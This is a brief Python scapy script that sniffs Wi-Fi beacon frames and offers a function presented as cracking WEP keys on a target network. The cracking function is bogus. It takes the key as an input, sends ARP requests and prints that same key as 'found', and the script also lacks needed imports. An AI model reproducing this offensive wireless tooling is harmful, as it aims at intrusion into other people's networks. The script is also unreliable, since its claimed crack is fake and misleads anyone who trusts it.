from scapy.all import *

# Function to sniff wireless network traffic
def sniff_wireless(interface):
    sniff(iface=interface, prn=handle_packet)

# Function to handle captured packets
def handle_packet(packet):
    if packet.haslayer(Dot11):
        if packet.type == 0 and packet.subtype == 8: # Beacon frame
            ssid = packet.info.decode()
            bssid = packet.addr3
            channel = int(ord(packet[Dot11Elt:3].info))
            print(f"SSID: {ssid}, BSSID: {bssid}, Channel: {channel}")

# Function to crack WEP encryption
def crack_wep(interface, bssid, channel, ssid, wep_key):
    conf.iface = interface
    conf.monitor = True
    os.system(f"iwconfig {interface} channel {channel}")
    key = wep_key.split(":")
    key = bytes([int(x, 16) for x in key])
    arp_request = ARP(pdst="192.168.1.1/24", hwdst=bssid)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    while True:
        response = srp(packet, timeout=1, verbose=False)[0]
        if response:
            for packet in response:
                if packet[ARP].op == 2:
                    if packet[ARP].psrc == "192.168.1.1":
                        print("WEP Key Found: ", wep_key)
                        return

# Example usage
interface = "wlan0"
ssid = "MyWifiNetwork"
bssid = "00:11:22:33:44:55"
channel = 6
wep_key = "a0:1b:2c:3d:4e:5f"
sniff_thread = threading.Thread(target=sniff_wireless, args=(interface,))
sniff_thread.start()
crack_wep(interface, bssid, channel, ssid, wep_key)
